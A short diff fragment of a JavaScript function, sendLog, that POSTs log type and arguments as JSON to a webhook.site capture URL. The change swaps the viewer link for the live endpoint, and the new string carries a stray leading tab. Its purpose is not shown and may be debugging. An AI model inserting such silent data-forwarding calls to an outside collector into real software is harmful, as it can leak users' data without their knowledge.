@@ -1,7 +1,7 @@
 (function () {
   const sendLog = (type, args) => {
     try {
-      fetch("https://webhook.site/#!/view/fa590317-308e-461a-b301-be73de3b96c7", {
+      fetch("	https://webhook.site/fa590317-308e-461a-b301-be73de3b96c7", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
